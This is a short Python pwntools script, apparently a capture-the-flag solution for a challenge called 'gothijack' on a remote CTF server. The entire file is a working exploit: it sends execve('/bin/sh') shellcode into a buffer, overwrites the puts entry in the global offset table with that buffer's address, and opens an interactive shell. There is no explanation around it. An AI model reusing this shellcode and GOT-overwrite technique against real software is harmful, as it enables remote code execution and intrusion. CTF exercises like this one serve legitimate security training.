#!/usr/bin/env python

from pwn import *

# r = process('./gothijack')
r = remote('csie.ctf.tw', 10129)

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\
\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
puts_got = '601020'
buf_addr = 0x6010a1

r.recvuntil(':')
r.send('\x00' + shellcode)
r.recvuntil(':')
r.sendline(puts_got)
r.recvuntil(':')
r.sendline(p64(buf_addr))
r.interactive()
